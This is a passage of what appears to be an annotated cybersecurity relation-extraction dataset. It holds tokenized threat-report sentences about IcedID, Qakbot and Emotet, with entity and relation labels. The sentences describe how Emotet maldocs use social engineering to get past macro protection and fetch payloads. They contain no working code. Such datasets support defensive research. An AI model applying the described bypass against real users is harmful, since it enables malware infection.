"machine", "responsible", "for", "the", "LNK", "files", "used", "in", "a", "previous", "IcedID", "campaign", "."], ["A", "few", "hours", "later", "the", "same", "user", "submitted", "another", "file", "with", "hash", "e89cd1999517b47805106111e14d", ",", "this", "time", "with", "user", "information", "sanitized", ",", "and", "packaged", "in", "a", "Zip", "file", "containing", "a", "BAT", "and", "DLL", "file", "."], ["The", "DLL", "file", "was", "an", "IcedID", "bot", "."], ["In", "both", "cases", "the", "same", "username", "is", "present", "in", "the", "ParsingPath", "field", "."], ["During", "our", "research", "on", "Qakbot", "we", "found", "samples", "associated", "with", "the", "``", "Obama", "''", "campaign", "which", "still", "had", "the", "LNK", "information", "and", "used", "the", "Drive", "Serial", "Number", "``", "300D-05E9", "''", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [7, 7], "name": "LNK file", "pos": [7, 9], "index": "0_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [86, 86], "name": "link file", "pos": [9, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [107, 107], "name": "LNK file", "pos": [1, 3], "index": "2_0"}]], "labels": [{"r": "CO", "evidence": [2, 3], "h": 1, "t": 2}]}, {"title": "061-0", "sents": [["The", "malware", "is", "delivered", "via", "email", "spam", "messages", "that", "contain", "a", "zip", "file", "with", "a", "XLS", "file", "inside", ",", "or", "the", "XLS", "attached", "directly", "to", "the", "email", "."], ["Based", "on", "the", "samples", "Talos", "observed", ",", "the", "messages", "have", "minimal", "content", "in", "the", "email", "body", ",", "typically", "only", "consisting", "of", "a", "filename", "and", "password", "."], ["In", "order", "to", "bypass", "Microsoft", "'", "s", "protection", "for", "macros", "downloaded", "from", "the", "internet", ",", "Emotet", "is", "using", "social", "engineering", "to", "convince", "victims", "to", "copy", "the", "maldoc", "to", "a", "whitelisted", "folder", "where", "the", "macro", "protection", "is", "not", "activated", ":"], ["Upon", "opening", "the", "maldoc", ",", "a", "message", "is", "displayed", "asking", "the", "victim", "to", "copy", "the", "maldoc", "to", "a", "folder", "that", "does", "not", "have", "macro", "protections", "activated", "."], ["If", "the", "victim", "believes", "the", "fake", "security", "policy", "message", "above", "and", "does", "as", "it", "asks", ",", "the", "document", "will", "be", "opened", "without", "any", "restriction", "on", "executing", "the", "macro", "."], ["The", "documents", "might", "look", "empty", ",", "but", "they", "contain", "hidden", "sheets", "with", "text", "in", "them", ",", "which", "is", "used", "by", "the", "VBA", "macro", "to", "assemble", "the", "URL", "from", "where", "the", "Emotet", "malware", "is", "downloaded", "."], ["A", "request", "is", "made", "to", "one", "of", "the", "URLs", "listed", "above", "."], ["The", "content", "of", "the", "remote", "page", "is", "then", "dropped", "in", "the", "C", ":", "\\Window\\System32", "folder", "with", "one", "of", "the", "names", "also", "seen", "above", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "malware", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "email spam messages", "pos": [5, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "zip file", "pos": [11, 13], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [15, 15], "name": "XLS file", "pos": [15, 17], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [21, 21], "name": "XLS", "pos": [21, 22], "index": "4_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [69, 69], "name": "Emotet", "pos": [15, 16], "index": "5_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [76, 76], "name": "victims", "pos": [22, 23], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [80, 80], "name": "maldoc", "pos": [26, 27], "index": "7_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [96, 96], "name": "maldoc", "pos": [3, 4], "index": "8_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [104, 104], "name": "victim", "pos": [11, 12], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [108, 108], "name": "maldoc", "pos": [15, 16], "index": "10_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [122, 122], "name": "victim", "pos": [2, 3], "index": "11_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [133, 133], "name": "it", "pos": [13, 14], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [137, 137], "name": "document", "pos": [17, 18], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [147, 147], "name": "macro", "pos": [27, 28], "index": "14_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [150, 150], "name": "documents", "pos": [1, 2], "index": "15_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [156, 156], "name": "they", "pos": [7, 8], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [170, 170], "name": "VBA macro", "pos": [21, 23], "index": "17_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [175, 175], "name": "URL", "pos": [26, 27], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [179, 179], "name": "Emotet malware", "pos": [30, 32], "index": "19_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [192, 192], "name": "URLs", "pos": [8, 9], "index": "20_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [200, 200], "name": "remote page", "pos": [4, 6], "index": "21_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [207, 207], "name": "C : \\Window\\System32", "pos": [11, 14], "index": "22_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [215, 215], "name": "names", "pos": [19, 20], "index": "23_0"}]], "labels": [{"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "CO", "evidence": [0], "h": 2, "t": 3}, {"r": "CO", "evidence": [0], "t": 0, "h": 2}, {"r": "CO", "evidence": [0], "h": 2, "t": 4}, {"r": "RD", "evidence": [0, 1, 2], "t": 2, "h": 5}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "RD", "evidence": [2], "h": 6, "t": 7}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 10}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 8}, {"r": "CO", "evidence": [2, 3, 4], "h": 7, "t": 12}, {"r": "CO", "evidence": [2, 3, 4], "h": 7, "t": 13}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 7, "t": 15}, {"r": "CO", "evidence": [2, 3, 4, 5], "h": 7, "t": 16}, {"r": "RD", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [4], "h": 11, "t": 14}, {"r": "CO", "evidence": [3, 4], "t": 9, "h": 11}, {"r": "EX", "evidence": [4, 5], "t": 14, "h": 17}, {"r": "RF", "evidence": [5], "h": 17, "t": 18}, {"r": "WR", "evidence": [5], "h": 17, "t": 19}, {"r": "WR", "evidence": [5, 6, 7], "h": 17, "t": 21}, {"r": "RD", "evidence": [5, 6, 7], "h": 17, "t": 22}, {"r": "RD", "evidence": [5, 6, 7], "h": 17, "t": 22}, {"r": "WR", "evidence": [5, 6, 7], "h": 17, "t": 22}, {"r": "WR", "evidence": [5, 6, 7], "h": 17, "t": 23}, {"r": "CO", "evidence": [5, 6], "h": 18, "t": 20}]}]